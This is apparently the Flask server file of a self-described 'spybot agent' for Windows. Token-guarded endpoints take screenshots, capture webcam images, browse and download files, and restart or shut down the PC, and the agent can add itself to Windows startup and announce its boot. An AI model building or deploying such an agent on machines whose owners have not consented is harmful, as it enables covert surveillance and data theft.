from flask import Flask, jsonify, request, send_file

from agent_features import (
    ARTIFACT_DIR as PC_AGENT_ARTIFACT_DIR,
    AgentFeatureError,
    capture_camera_image,
    capture_screenshot,
    list_directory,
    prepare_download_file,
)
from auth import require_agent_token
from boot_notify import notify_agent_boot
from config import AGENT_HOST, AGENT_NAME, AGENT_PORT, CAMERA_INDEX, START_WITH_WINDOWS
from logger_setup import setup_logger
from power_actions import restart_pc, shutdown_pc
from startup import add_to_startup
from system_info import get_status_payload

app = Flask(__name__)
logger = setup_logger()


@app.errorhandler(AgentFeatureError)
def handle_agent_feature_error(exc: AgentFeatureError):
    return jsonify({
        "ok": False,
        "error": exc.error,
        "message": exc.message,
        "host": AGENT_NAME,
    }), exc.status_code


@app.get("/health")
@require_agent_token
def health():
    return jsonify({
        "ok": True,
        "host": AGENT_NAME,
        "agent_version": "1.2-extended",
        "message": "agent is healthy",
    })


@app.get("/info")
@require_agent_token
def info():
    return jsonify({
        "ok": True,
        "host": AGENT_NAME,
        "agent_role": "windows-worker",
        "supports": [
            "health",
            "info",
            "status",
            "restart",
            "shutdown",
            "screenshot",
            "camera",
            "explorer",
            "download",
        ],
        "artifact_dir": str(PC_AGENT_ARTIFACT_DIR),
        "camera_config": {
            "configured_index": CAMERA_INDEX,
        },
    })


@app.get("/status")
@require_agent_token
def status():
    payload = get_status_payload()
    return jsonify({
        "ok": True,
        "host": AGENT_NAME,
        "data": payload,
    })


@app.get("/screenshot")
@require_agent_token
def screenshot():
    result = capture_screenshot()
    response = send_file(
        result["path"],
        mimetype=result["mimetype"],
        as_attachment=False,
        download_name=result["filename"],
    )
    response.headers["X-Agent-Host"] = AGENT_NAME
    return response


@app.get("/camera")
@require_agent_token
def camera():
    camera_index = request.args.get("index", type=int)
    result = capture_camera_image(camera_index=camera_index)
    response = send_file(
        result["path"],
        mimetype=result["mimetype"],
        as_attachment=False,
        download_name=result["filename"],
    )
    response.headers["X-Agent-Host"] = AGENT_NAME
    return response


@app.get("/explorer")
@require_agent_token
def explorer():
    target_path = request.args.get("path")
    payload = list_directory(target_path)
    return jsonify({
        "ok": True,
        "host": AGENT_NAME,
        "data": payload,
    })


@app.get("/download")
@require_agent_token
def download():
    target_path = request.args.get("path")
    result = prepare_download_file(target_path or "")
    response = send_file(
        result["path"],
        mimetype=result["mimetype"],
        as_attachment=True,
        download_name=result["filename"],
    )
    response.headers["X-Agent-Host"] = AGENT_NAME
    return response


@app.post("/restart")
@require_agent_token
def restart():
    result = restart_pc()
    status_code = 200 if result.get("ok") else 400
    result["host"] = AGENT_NAME
    return jsonify(result), status_code


@app.post("/shutdown")
@require_agent_token
def shutdown():
    result = shutdown_pc()
    status_code = 200 if result.get("ok") else 400
    result["host"] = AGENT_NAME
    return jsonify(result), status_code


if __name__ == "__main__":
    logger.info("Starting spybot agent on %s:%s", AGENT_HOST, AGENT_PORT)
    if START_WITH_WINDOWS:
        startup_ok = add_to_startup()
        logger.info("Startup registration attempted: %s", startup_ok)
    try:
        notify_agent_boot()
        logger.info("Boot notification sent")
    except Exception:
        logger.exception("Failed to send boot notification")
    app.run(host=AGENT_HOST, port=AGENT_PORT, debug=False)
